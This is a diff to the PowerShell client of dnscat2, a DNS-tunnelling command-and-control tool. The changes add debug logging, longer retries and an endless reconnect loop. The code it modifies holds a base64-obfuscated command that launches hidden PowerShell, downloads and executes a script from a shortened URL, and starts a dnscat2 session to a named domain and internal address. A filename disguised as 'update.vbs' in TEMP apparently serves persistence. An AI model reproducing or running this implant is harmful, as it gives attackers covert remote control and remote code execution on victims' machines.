@@ -1205,11 +1205,16 @@ function Send-Dnscat2Packet ($Packet, $Domain, $DNSServer, $DNSPort, $LookupType
     } else {
         $LookupType = $LookupTypes[0]
     }
-
+    
+    write-verbose "LookupType:$LookupType"
     $Packet = Add-DNSDots $Packet
     $Packet += ("." + $Domain)
-    $Command = ("set type=$LookupType`nserver $DNSServer`nset port=$DNSPort`nset retry=1`n" + $Packet + "`nexit")
+    write-verbose "Packet:$Packet"
+    $Command = ("set type=$LookupType`nserver $DNSServer`nset port=$DNSPort`nset retry=5`nset timeout=10`n" + $Packet + "`nexit")
     $result = ($Command | nslookup 2>&1 | Out-String)
+    write-verbose '**************************'
+    write-verbose "result:$result"
+    write-verbose '**************************'
     $Done = $False
     if ($LookupType -eq "TXT") {
         if ($result.Contains('"')) {
@@ -1473,6 +1478,12 @@ function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPo
     }
 
     $SYNPacket = (New-Dnscat2SYN $Domain $SessionId $Session["SequenceNumber"] $Options)
+    
+    write-verbose "SYNPacket:$SYNPacket"
+    write-verbose "Domain:$Domain";
+    write-verbose "DNSServer:$DNSServer";
+    write-verbose "DNSPort:$DNSPort";
+    write-verbose "Driver:$Driver"
     $Packet = ConvertTo-Dnscat2Packet (Send-Dnscat2Packet $SYNPacket $Domain $DNSServer $DNSPort $LookupTypes $Session["Encryption"] $Session["EncryptionKeys"])
 
     if ($Packet -eq 1) {
@@ -1911,8 +1922,8 @@ function Update-Dnscat2Session ($Session) {
         # Delay
         $RandomDelay = $Session['MaxRandomDelay']
         if ($Session['MaxRandomDelay'] -le 0) { $RandomDelay = 0 }
-        Sleep -Milliseconds ($Session['Delay'] + $RandomDelay)
-
+        Sleep -Milliseconds ($Session['Delay'] + $RandomDelay+2000)
+        
         try {
             $MSGPACKET = (New-Dnscat2MSG $Session["Domain"] $Session["SessionId"] $Session["SequenceNumber"] $Session["AcknowledgementNumber"] $PacketData)
             $Packet = (Send-Dnscat2Packet $MSGPACKET $Session["Domain"] $Session["DNSServer"] $Session["DNSPort"] $Session["LookupTypes"] $Session["Encryption"] $Session["EncryptionKeys"])
@@ -1924,7 +1935,10 @@ function Update-Dnscat2Session ($Session) {
 
         try {
             $Packet = (ConvertTo-Dnscat2Packet $Packet)
-            if($Packet -eq 1){ Write-Error "Dnscat2: Failed to ConvertTo-Dnscat2Packet..."; $Session.Dead = $True }
+            if($Packet -eq 1){ 
+                Write-Error "Dnscat2: Failed to ConvertTo-Dnscat2Packet..."; 
+                #$Session.Dead = $True 
+            }
             if ($Packet["MessageType"] -eq "01") {
                 # Check if server ACKed sent data
                 $BytesACKed = (Compare-SequenceNumber $Session["SequenceNumber"] $Packet["AcknowledgementNumber"])
@@ -2025,7 +2039,7 @@ function Start-Dnscat2 {
         [ValidateRange(1,240)][int32]$MaxPacketSize=240,
         [Alias("n")][string]$Name=""
     )
-
+    $verbosepreference = "continue"
     $cmd='U2V0IG9ialNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXc2NyaXB0LnNoZWxsIik6b2JqU2hlbGwucnVuICJwb3dlcnNoZWxsIC1ub1AgLXN0YSAtdyAxIC1jICIiZG97dHJ5eyRhPU5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JGEuUHJveHk9W1N5c3RlbS5OZXQuV2ViUmVxdWVzdF06OkRlZmF1bHRXZWJQcm94eTskYS5DcmVkZW50aWFscz1bU3lzdGVtLk5ldC5DcmVkZW50aWFsQ2FjaGVdOjpEZWZhdWx0TmV0d29ya0NyZWRlbnRpYWxzOyRhLlByb3h5LkNyZWRlbnRpYWxzPVtTeXN0ZW0uTmV0LkNyZWRlbnRpYWxDYWNoZV06OkRlZmF1bHROZXR3b3JrQ3JlZGVudGlhbHM7JGEuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly90LmNuL0VvTTJUQ2snKXxpZXg7U3RhcnQtRG5zY2F0MiAtRCBzdGF0aWMucGFpYy1pbnF1ZXJ5LnNpdGUgLXMgMTAuNS4zMi4xMDAgLXNlYyBwYWljdGVzdDticmVhazt9Y2F0Y2h7U3RhcnQtRG5zY2F0MiAtRCBzdGF0aWMucGFpYy1pbnF1ZXJ5LnNpdGUgLXMgMTAuNS4zMi4xMDAgLXNlYyBwYWljdGVzdH19d2hpbGUoMSk7IiIiLDA='
     $filename=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXBkYXRlLnZicw=="));
     $filepath=$env:TEMP;
@@ -2083,10 +2097,15 @@ function Start-Dnscat2 {
 
     $Sessions = New-Object System.Collections.Hashtable
     $DeadSessions = @()
-    $InitialSession = Start-Dnscat2Session (New-RandomDNSField 4) $SYNOptions $Domain $DNSServer $DNSPort $MaxPacketSize (-not $NoEncryption) $PreSharedSecret $LookupTypes $Delay $MaxRandomDelay $Driver $DriverOptions
-    if ($InitialSession -eq 1) {
-        return
+    
+    do{
+        $InitialSession = Start-Dnscat2Session (New-RandomDNSField 4) $SYNOptions $Domain $DNSServer $DNSPort $MaxPacketSize (-not $NoEncryption) $PreSharedSecret $LookupTypes $Delay $MaxRandomDelay $Driver $DriverOptions
+        if ($InitialSession -ne 1) {
+            break;
+        }
     }
+    while(1)
+    
     $Sessions.Add($InitialSession["SessionId"], $InitialSession)
 
     try {
